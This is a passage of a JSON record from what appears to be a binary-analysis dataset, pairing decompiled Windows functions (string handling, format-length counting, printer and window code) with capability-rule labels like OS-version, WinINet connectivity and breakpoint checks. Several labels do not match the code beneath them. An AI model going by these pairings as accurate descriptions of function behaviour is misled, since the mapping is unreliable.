        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __cdecl\nfcn.004199a0(uint noname_0, uint noname_1, int32_t *noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6\n            , uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint hWnd, uint hdc, \n            uint nXLeft)\n\n{\n    int32_t iVar1;\n    uint16_t uVar2;\n    uint var_ch;\n    uint32_t var_14h_2;\n    uint var_4h;\n    uint uStack52;\n    uint uStack48;\n    int32_t iStack44;\n    int32_t iStack40;\n    int32_t iStack36;\n    int32_t iStack32;\n    uint uStack28;\n    uint var_14h;\n    uint crColor;\n    uint lpchText;\n    \n    uStack28 = 0xf00021;\n    iStack40 = noname_2[1];\n    iStack44 = *noname_2;\n    iStack32 = noname_2[3] - iStack40;\n    iStack36 = noname_2[2] - iStack44;\n    uStack48 = var_ch;\n    uStack52 = 0x4199ce;\n    (*_sym.imp.GDI32.dll_PatBlt)();\n    uStack52 = noname_0;\n    iVar1 = (*_sym.imp.USER32.dll_GetWindowTextLengthA)();\n    fcn.0040b610();\n    if (*0x10 != 0x34) {\n        iVar1 = (*_sym.imp.USER32.dll_GetWindowTextA)(noname_0, &stack0xffffffcc, iVar1 + 2);\n        if (iVar1 != 0) {\n            uVar2 = 0x140;\n            if ((var_14h_2 & 0xf) != 0xc) {\n                uVar2 = var_14h_2 & 0xf | 0x150;\n            }\n            if ((var_14h_2 & 0x80) != 0) {\n                uVar2 = uVar2 | 0x800;\n            }\n            if ((var_14h_2 & 0x8000000) != 0) {\n                crColor = (*_sym.imp.GDI32.dll_SetTextColor)(var_ch, *0x44f41c);\n            }\n            (*_sym.imp.USER32.dll_DrawTextA)(var_ch, &stack0xffffffcc, 0xffffffff, noname_2, uVar2);\n            if ((var_14h_2 & 0x8000000) != 0) {\n                (*_sym.imp.GDI32.dll_SetTextColor)(var_ch, crColor);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 640
    },
    "00419d70": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.00419d70(uint param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    uint unaff_ESI;\n    \n    if (param_2 == 1) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"KERNEL32.DLL\");\n        pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1, \"DisableThreadLibraryCalls\");\n        if (pcVar2 != NULL) {\n            (*pcVar2)(unaff_ESI);\n        }\n        (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(0x44f3c0);\n        *0x44f3f8 = unaff_ESI;\n        *0x44f3fc = unaff_ESI;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetVersion)();\n        pcVar2 = _sym.imp.USER32.dll_GetSystemMetrics;\n        *0x44f400 = CONCAT11(uVar3, uVar3 >> 8);\n        if (((uVar3 & 0x80000000) == 0) || (*0x44f402 = 0x10,  0x35e < *0x44f400)) {\n            *0x44f402 = 0x20;\n        }\n        *0x44fed4 = (*_sym.imp.USER32.dll_GetSystemMetrics)(7);\n        *0x44fed4 = *0x44fed4 + -1;\n        *0x44fed8 = (*pcVar2)(8);\n        *0x44fed8 = *0x44fed8 + -1;\n        *0x44fedc = (*pcVar2)(4);\n        *0x44fee0 = (*pcVar2)(0x1e);\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x44f3c0);\n    }\n    return 1;\n}\n",
        "token_count": 430
    },
    "0041a6ee": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041a6ee(code **param_1)\n\n{\n    *param_1 = vtable.exception.0;\n    if (param_1[2] != NULL) {\n        fcn.0041bd2d(param_1[1]);\n    }\n    return;\n}\n",
        "token_count": 65
    },
    "0041afe1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0041afe1(uint *param_1, char *param_2, int32_t *param_3)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t *piVar5;\n    int32_t *piVar6;\n    int32_t iVar7;\n    uint unaff_retaddr;\n    int32_t iStack16;\n    uint32_t uStack12;\n    \n    iStack16 = 0;\n    cVar1 = *param_2;\n    piVar6 = param_3;\n    do {\n        if (cVar1 == '\\0') {\n            fcn.0041d546(iStack16);\n            fcn.0040bfc2(*param_1, unaff_retaddr, param_1);\n            fcn.0041d595(0xffffffff);\n            return;\n        }\n        if (*param_2 == '%') {\n            param_2 = fcn.0040bf39(param_2);\n            cVar1 = *param_2;\n            if (cVar1 == '%') goto code_r0x0041b29c;\n            iVar7 = 0;\n            param_3 = NULL;\n            if (cVar1 == '\\0') {\ncode_r0x0041b06e:\n                param_3 = fcn.0040c232(param_2);\n                while ((piVar5 = piVar6,  *param_2 != '\\0' && (iVar2 = fcn.0040c118(*param_2),  iVar2 != 0))) {\n                    param_2 = fcn.0040bf39(param_2);\n                }\n            }\n            else {\n                do {\n                    if (cVar1 == '#') {\n                        iStack16 = iStack16 + 2;\n                    }\n                    else if (cVar1 == '*') {\n                        param_3 = *piVar6;\n                        piVar6 = piVar6 + 1;\n                    }\n                    else if ((((cVar1 != '-') && (cVar1 != '+')) && (cVar1 != '0')) && (cVar1 != ' ')) break;\n                    param_2 = fcn.0040bf39(param_2);\n                    cVar1 = *param_2;\n                } while (cVar1 != '\\0');\n                piVar5 = piVar6;\n                if (param_3 == NULL) goto code_r0x0041b06e;\n            }\n            iVar2 = 0;\n            if (*param_2 == '.') {\n                param_2 = fcn.0040bf39(param_2);\n                if (*param_2 == '*') {\n                    iVar2 = *piVar5;\n                    piVar5 = piVar5 + 1;\n                    param_2 = fcn.0040bf39(param_2);\n                }\n                else {\n                    iVar2 = fcn.0040c232(param_2);\n                    while ((*param_2 != '\\0' && (iVar3 = fcn.0040c118(*param_2),  iVar3 != 0))) {\n                        param_2 = fcn.0040bf39(param_2);\n                    }\n                }\n            }\n            uStack12 = 0;\n            iVar3 = fcn.0040c029(param_2, 0x42a0c0, 3);\n            if (iVar3 == 0) {\n                param_2 = param_2 + 3;\n                uStack12 = 0x40000;\n            }\n            else {\n                cVar1 = *param_2;\n                if (((cVar1 != 'F') && (cVar1 != 'L')) && (cVar1 != 'N')) {\n                    if (cVar1 == 'h') {\n                        uStack12 = 0x10000;\n                    }\n                    else {\n                        if (cVar1 != 'l') goto code_r0x0041b140;\n                        uStack12 = 0x20000;\n                    }\n                }\n                param_2 = fcn.0040bf39(param_2);\n            }\ncode_r0x0041b140:\n            uVar4 = *param_2 | uStack12;\n            piVar6 = piVar5;\n            if (uVar4 < 0x10064) {\n                if ((uVar4 == 0x10063) || (uVar4 == 0x43)) {\ncode_r0x0041b1f8:\n                    iVar7 = 2;\n                }\n                else {\n                    if (uVar4 == 0x53) goto code_r0x0041b1e5;\n                    if (uVar4 == 99) goto code_r0x0041b1f8;\n                    if (uVar4 != 0x73) {\n                        if (uVar4 == 0x10043) goto code_r0x0041b1f8;\n                        if (uVar4 != 0x10053) goto code_r0x0041b181;\n                    }\ncode_r0x0041b200:\n                    if (*piVar5 == 0) goto code_r0x0041b20a;\n                    iVar7 = (*_sym.imp.KERNEL32.dll_lstrlenA)(*piVar5);\ncode_r0x0041b216:\n                    if (iVar7 < 1) {\n                        iVar7 = 1;\n                    }\n                    piVar6 = piVar5 + 1;\n                    if (iVar7 == 0) goto code_r0x0041b181;\n                }\ncode_r0x0041b228:\n                piVar6 = piVar5 + 1;\n                if ((iVar2 != 0) && (iVar2 <= iVar7)) {\n                    iVar7 = iVar2;\n                }\n                if (iVar7 <= param_3) {\n                    iVar7 = param_3;\n                }\n            }\n            else {\n                if (uVar4 == 0x10073) goto code_r0x0041b200;\n                if (uVar4 == 0x20043) goto code_r0x0041b1f8;\n                if (uVar4 == 0x20053) {\ncode_r0x0041b1e5:\n                    if (*piVar5 != 0) {\n                        iVar7 = fcn.0040be85(*piVar5);\n                        goto code_r0x0041b216;\n                    }\ncode_r0x0041b20a:\n                    iVar7 = 6;\n                    goto code_r0x0041b228;\n                }\n                if (uVar4 == 0x20063) goto code_r0x0041b1f8;\n                if (uVar4 == 0x20073) goto code_r0x0041b1e5;\ncode_r0x0041b181:\n                cVar1 = *param_2;\n                if (cVar1 < 'j') {\n                    if (cVar1 == 'i') goto code_r0x0041b283;\n                    if (cVar1 == 'G') goto code_r0x0041b24e;\n                    if ((cVar1 == 'X') || (cVar1 == 'd')) goto code_r0x0041b283;\n                    if (cVar1 == 'e') {\ncode_r0x0041b24e:\n                        piVar6 = piVar6 + 2;\n                        iVar7 = 0x80;\n                        goto code_r0x0041b275;\n                    }\n                    if (cVar1 != 'f') {\n                        if (cVar1 != 'g') goto code_r0x0041b292;\n                        goto code_r0x0041b24e;\n                    }\n                    piVar6 = piVar6 + 2;\n                    iVar7 = 0x80;\n                    iVar2 = iVar2 + 0x138;\n                }\n                else {\n                    if (cVar1 == 'n') {\n                        piVar6 = piVar6 + 1;\n                        goto code_r0x0041b292;\n                    }\n                    if (cVar1 == 'o') {\ncode_r0x0041b283:\n                        if ((uStack12 & 0x40000) == 0) goto code_r0x0041b26f;\n                        piVar6 = piVar6 + 2;\n                    }\n                    else {\n                        if (cVar1 != 'p') {\n                            if ((cVar1 != 'u') && (cVar1 != 'x')) goto code_r0x0041b292;\n                            goto code_r0x0041b283;\n                        }\ncode_r0x0041b26f:\n                        piVar6 = piVar6 + 1;\n                    }\n                    iVar7 = 0x20;\ncode_r0x0041b275:\n                    iVar2 = param_3 + iVar2;\n                }\n                if (iVar7 <= iVar2) {\n                    iVar7 = iVar2;\n                }\n            }\ncode_r0x0041b292:\n            iStack16 = iStack16 + iVar7;\n        }\n        else {\ncode_r0x0041b29c:\n            iVar7 = fcn.0040c013(param_2);\n            iStack16 = iStack16 + iVar7;\n        }\n        param_2 = fcn.0040bf39(param_2);\n        cVar1 = *param_2;\n    } while( true );\n}\n",
        "token_count": 2040
    },
    "0041b6e2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041b6e2(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint unaff_ESI;\n    uint uStack8;\n    \n    if (*(param_1 + 0x10) == 0) {\n        uStack8 = 0xc;\n        iVar1 = fcn.0041b7fa(param_1 + 0x14, *(param_1 + 0x18));\n        iVar3 = *(param_1 + 0x18);\n        puVar2 = iVar1 + -8 + iVar3 * 0xc;\n        if (-1 < iVar3 + -1) {\n            do {\n                *puVar2 = *(param_1 + 0x10);\n                *(param_1 + 0x10) = puVar2;\n                puVar2 = puVar2 + -3;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n    }\n    puVar2 = *(param_1 + 0x10);\n    *(param_1 + 0x10) = *puVar2;\n    puVar2[1] = uStack8;\n    *puVar2 = unaff_ESI;\n    *(param_1 + 0xc) = *(param_1 + 0xc) + 1;\n    puVar2[2] = 0;\n    return;\n}\n",
        "token_count": 322
    },
    "0041b873": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0041b873(int32_t param_1, int32_t param_2, int32_t param_3)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 4) != 0) {\n        fcn.0041bd2d(*(param_1 + 4));\n        *(param_1 + 4) = 0;\n    }\n    if (param_3 != 0) {\n        uVar1 = fcn.0041bd04(param_2 << 2);\n        *(param_1 + 4) = uVar1;\n        fcn.0040b990(uVar1, 0, param_2 << 2);\n    }\n    *(param_1 + 8) = param_2;\n    return;\n}\n",
        "token_count": 174
    },
    "0041b90c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041b90c(int32_t param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    \n    if (*(param_1 + 0x10) == 0) {\n        iVar2 = fcn.0041b7fa(param_1 + 0x14, *(param_1 + 0x18), 0xc);\n        iVar4 = *(param_1 + 0x18);\n        puVar3 = iVar2 + -8 + iVar4 * 0xc;\n        if (-1 < iVar4 + -1) {\n            do {\n                *puVar3 = *(param_1 + 0x10);\n                *(param_1 + 0x10) = puVar3;\n                puVar3 = puVar3 + -3;\n                iVar4 = iVar4 + -1;\n            } while (iVar4 != 0);\n        }\n    }\n    puVar3 = *(param_1 + 0x10);\n    uVar1 = *puVar3;\n    *(param_1 + 0xc) = *(param_1 + 0xc) + 1;\n    *(param_1 + 0x10) = uVar1;\n    puVar3[1] = 0;\n    puVar3[2] = 0;\n    return;\n}\n",
        "token_count": 306
    },
    "0041bc3d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041bc3d(uint lpString2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    int32_t var_4h;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GlobalLock;\n    if (*(in_ECX + 0x98) != 0) {\n        var_4h = in_ECX;\n        iVar2 = (*_sym.imp.KERNEL32.dll_GlobalLock)(*(in_ECX + 0x98));\n        iVar2 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(*(iVar2 + 2) + iVar2, lpString2);\n        if (iVar2 == 0) {\n            iVar2 = sub.WINSPOOL.DRV_OpenPrinterA(lpString2, &var_4h, 0);\n            if (iVar2 != 0) {\n                if (*(in_ECX + 0x94) != 0) {\n                    fcn.004225ba(*(in_ECX + 0x94));\n                }\n                uVar3 = sub.WINSPOOL.DRV_DocumentPropertiesA(0, var_4h, lpString2, 0, 0, 0);\n                uVar3 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)(0x42, uVar3);\n                *(in_ECX + 0x94) = uVar3;\n                uVar3 = (*pcVar1)(uVar3);\n                iVar2 = sub.WINSPOOL.DRV_DocumentPropertiesA(0, var_4h, lpString2, uVar3, 0, 2);\n                if (iVar2 != 1) {\n                    fcn.004225ba(*(in_ECX + 0x94));\n                    *(in_ECX + 0x94) = 0;\n                }\n                sub.WINSPOOL.DRV_ClosePrinter(var_4h);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 430
    },
    "0041bd4d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.0041bd4d(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    iVar1 = fcn.00423ff7();\n    if (*(iVar1 + 0x14) == '\\0') {\n        iVar1 = fcn.00423dca();\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n        uVar2 = (*_sym.imp.USER32.dll_SetWindowsHookExA)(0xffffffff, 0x41c0a2, 0, uVar2);\n        *(iVar1 + 0x30) = uVar2;\n        iVar1 = fcn.0042489d(0x4239cb);\n        if (*(iVar1 + 0x14) != 0) {\n            iVar3 = fcn.00423ff7();\n            (**(iVar1 + 0x14))(*(iVar3 + 8));\n        }\n        fcn.00424808(0x4239e0);\n    }\n    return;\n}\n",
        "token_count": 230
    },
    "0041c436": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0041c436(int32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t *in_ECX;\n    uint32_t arg_ch_00;\n    int32_t *piVar5;\n    \n    if (arg_ch == 0xfffffffe) {\n        iVar1 = fcn.00423ff7();\n        iVar1 = (**(**(iVar1 + 0x1038) + 4))();\n        return iVar1;\n    }\n    if (arg_ch == 0xfffffffd) {\n        arg_ch = 0;\n        iVar1 = *(arg_10h + 0x30);\n        puVar2 = (**(*in_ECX + 0x2c))();\n        do {\n            if (puVar2 == NULL) {\n                return arg_ch;\n            }\n            if (arg_ch != 0) {\n                return arg_ch;\n            }\n            piVar5 = puVar2[1];\n            while (((piVar5[1] != 0 && (piVar5[2] != 0)) && (arg_ch == 0))) {\n                if (arg_8h == piVar5[1]) {\n                    if (iVar1 == 0) {\n                        iVar3 = *piVar5;\n                    }\n                    else {\n                        if (*piVar5 == 0) goto code_r0x0041c4d9;\n                        iVar3 = fcn.0040b9f0(iVar1, *piVar5, 0x10);\n                    }\n                    if (iVar3 == 0) {\n                        arg_ch = 1;\n                        *(arg_10h + 4) = piVar5[2];\n                    }\n                }\ncode_r0x0041c4d9:\n                piVar5 = piVar5 + 3;\n            }\n            puVar2 = *puVar2;\n        } while( true );\n    }\n    if (arg_ch != 0xffffffff) {\n        uVar4 = arg_ch & 0xffff;\n        arg_ch_00 = arg_ch >> 0x10;\n        arg_ch = uVar4;\n        if (arg_ch_00 != 0) goto code_r0x0041c4fe;\n    }\n    arg_ch_00 = 0x111;\ncode_r0x0041c4fe:\n    puVar2 = (**(*in_ECX + 0x28))();\n    while( true ) {\n        if (puVar2 == NULL) {\n            return 0;\n        }\n        iVar1 = fcn.0041e9b9(puVar2[1], arg_ch_00, arg_ch, arg_8h);\n        if (iVar1 != 0) break;\n        puVar2 = *puVar2;\n    }\n    iVar1 = fcn.0041c32f(in_ECX, arg_8h, arg_ch, *(iVar1 + 0x14), arg_10h, *(iVar1 + 0x10), arg_14h);\n    return iVar1;\n}\n",
        "token_count": 699
    },
    "0041d032": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.0041d032(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = *param_2;\n    if (*(iVar1 + -0xc) < 0) {\n        *param_1 = *0x449654;\n        fcn.0041d402(*param_2);\n    }\n    else {\n        *param_1 = iVar1;\n        (*_sym.imp.KERNEL32.dll_InterlockedIncrement)(iVar1 + -0xc);\n    }\n    return param_1;\n}\n",
        "token_count": 132
    },
    "0041d248": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041d248(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    \n    if (*(*param_1 + -8) != 0) {\n        if (-1 < *(*param_1 + -0xc)) {\n            if (*param_1 + -0xc != *0x449658) {\n                iVar1 = (*_sym.imp.KERNEL32.dll_InterlockedDecrement)(*param_1 + -0xc);\n                if (iVar1 < 1) {\n                    fcn.0041d1ac();\n                }\n                *param_1 = *0x449654;\n            }\n            return;\n        }\n        fcn.0041d402(0x44b870);\n    }\n    return;\n}\n",
        "token_count": 164
    },
    "0041d266": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041d266(int32_t *param_1)\n\n{\n    int32_t arg_ch;\n    \n    arg_ch = *param_1;\n    if (1 < *(arg_ch + -0xc)) {\n        fcn.0041d1f4();\n        fcn.0041d12a(*(arg_ch + -8));\n        fcn.0040bb50(*param_1, arg_ch, *(arg_ch + -8) + 1);\n    }\n    return;\n}\n",
        "token_count": 111
    },
    "0041d294": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0041d294(int32_t *param_1, int32_t param_2)\n\n{\n    if ((1 < *(*param_1 + -0xc)) || (*(*param_1 + -4) < param_2)) {\n        fcn.0041d1f4();\n        fcn.0041d12a(param_2);\n    }\n    return;\n}\n",
        "token_count": 88
    },
    "0041d3b2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.0041d3b2(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = *param_1;\n    iVar2 = *param_2;\n    if (iVar1 != iVar2) {\n        if (((*(iVar1 + -0xc) < 0) && (iVar1 + -0xc != *0x449658)) || (*(iVar2 + -0xc) < 0)) {\n            fcn.0041d385(*(iVar2 + -8), iVar2);\n        }\n        else {\n            fcn.0041d1f4();\n            iVar1 = *param_2;\n            *param_1 = iVar1;\n            (*_sym.imp.KERNEL32.dll_InterlockedIncrement)(iVar1 + -0xc);\n        }\n    }\n    return param_1;\n}\n",
        "token_count": 204
    },
    "0041d4a8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0041d4a8(int32_t *param_1, int32_t param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    \n    if (param_2 != 0) {\n        iVar1 = *param_1;\n        if ((*(iVar1 + -0xc) < 2) && (*(iVar1 + -8) + param_2 <= *(iVar1 + -4))) {\n            fcn.0040bb50(*(iVar1 + -8) + iVar1, param_3, param_2);\n            *(*param_1 + -8) = *(*param_1 + -8) + param_2;\n            *(*(*param_1 + -8) + *param_1) = 0;\n        }\n        else {\n            fcn.0041d46a(*(iVar1 + -8), iVar1, param_2, param_3);\n            fcn.0041d225(iVar1 + -0xc);\n        }\n    }\n    return;\n}\n",
        "token_count": 225
    },
    "0041d546": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.0041d546(int32_t *param_1, int32_t param_2)\n\n{\n    int32_t arg_ch;\n    int32_t iVar1;\n    \n    arg_ch = *param_1;\n    if ((1 < *(arg_ch + -0xc)) || (*(arg_ch + -4) < param_2)) {\n        iVar1 = *(arg_ch + -8);\n        if (param_2 < iVar1) {\n            param_2 = iVar1;\n        }\n        fcn.0041d12a(param_2);\n        fcn.0040bb50(*param_1, arg_ch, iVar1 + 1);\n        *(*param_1 + -8) = iVar1;\n        fcn.0041d225(arg_ch + -0xc);\n    }\n    return *param_1;\n}\n",
        "token_count": 186
    },
    "0041d981": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_40h\n\nuint fcn.0041d981(void)\n\n{\n    int32_t *arg_8h;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint *puVar4;\n    uint *puVar5;\n    uint *in_FS_OFFSET;\n    uint var_8h;\n    uint var_ch;\n    uint var_10h_2;\n    uint var_14h_2;\n    uint var_18h;\n    uint var_10h;\n    uint var_40h;\n    uint var_24h;\n    uint var_14h;\n    uint var_ch_2;\n    uint var_4h;\n    \n    fcn.0040b7d8();\n    *(unaff_EBP + -0x10) = &stack0xffffffc0;\n    iVar1 = fcn.00424808(0x423997);\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x14) = iVar1;\n    puVar4 = iVar1 + 0x34;\n    puVar5 = unaff_EBP + -0x40;\n    for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = *puVar4;\n        puVar4 = puVar4 + 1;\n        puVar5 = puVar5 + 1;\n    }\n    iVar3 = *(unaff_EBP + 0x10);\n    arg_8h = *(unaff_EBP + 8);\n    *(iVar1 + 0x34) = *(unaff_EBP + 0xc);\n    *(iVar1 + 0x3c) = *(unaff_EBP + 0x14);\n    uVar2 = *(unaff_EBP + 0x18);\n    *(iVar1 + 0x38) = iVar3;\n    *(iVar1 + 0x40) = uVar2;\n    if ((iVar3 == 2) && (arg_8h[0xd] != NULL)) {\n        (**(*arg_8h[0xd] + 0x5c))(0);\n    }\n    *(unaff_EBP + 8) = 0;\n    if (iVar3 == 0x110) {\n        fcn.0041d80e(arg_8h, unaff_EBP + -0x24, unaff_EBP + 8);\n    }\n    uVar2 = (**(*arg_8h + 0x98))(iVar3, *(unaff_EBP + 0x14), *(unaff_EBP + 0x18));\n    *(unaff_EBP + 0x18) = uVar2;\n    if (iVar3 == 0x110) {\n        fcn.0041d831(arg_8h, unaff_EBP + -0x24);\n    }\n    uVar2 = *(unaff_EBP + 0x18);\n    puVar4 = unaff_EBP + -0x40;\n    puVar5 = iVar1 + 0x34;\n    for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = *puVar4;\n        puVar4 = puVar4 + 1;\n        puVar5 = puVar5 + 1;\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar2;\n}\n",
        "token_count": 784
    },
    "0041dad0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.0041dad0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040b7d8();\n    iVar1 = fcn.0042401d();\n    if ((*(iVar1 + 0x14) == 0) && (*(unaff_EBP + 8) != 0)) {\n        uVar2 = fcn.0041bcf2(0x4225f0);\n        iVar3 = fcn.0041bd04(0x48);\n        *(unaff_EBP + 8) = iVar3;\n        *(unaff_EBP + -4) = 0;\n        if (iVar3 == 0) {\n            uVar4 = 0;\n        }\n        else {\n            uVar4 = fcn.004209ee(0x42a0c8, 0x1c, 1);\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        *(iVar1 + 0x14) = uVar4;\n        fcn.0041bcf2(uVar2);\n    }\n    uVar2 = *(iVar1 + 0x14);\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar2;\n}\n",
        "token_count": 358
    },
    "0041ddff": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
